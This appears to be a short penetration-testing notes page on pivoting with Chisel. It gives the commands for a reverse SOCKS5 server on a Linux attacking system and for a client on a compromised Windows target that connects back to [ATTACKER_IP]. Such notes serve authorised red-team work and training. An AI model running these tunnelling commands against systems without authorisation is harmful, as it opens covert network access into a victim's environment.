---
description: >-
  Example scenario for pivoting using Chisel. Note, this example assumes that
  the attacking system is Linux and the target system is Windows.
---

# Using Chisel to Pivot

1. Download the [latest Chisel binaries](https://github.com/jpillora/chisel)
   * Note, you will need one for your attacking system and one to be uploaded to the target system.
2. On the attacking system: `./chisel server --socks5 --reverse -p 8000`
3. On the target system: `.\chisel.exe client [ATTACKER_IP]:8000 R:socks`
4. Observe on the attacking system that the SOCKS5 connection has been successfully established.
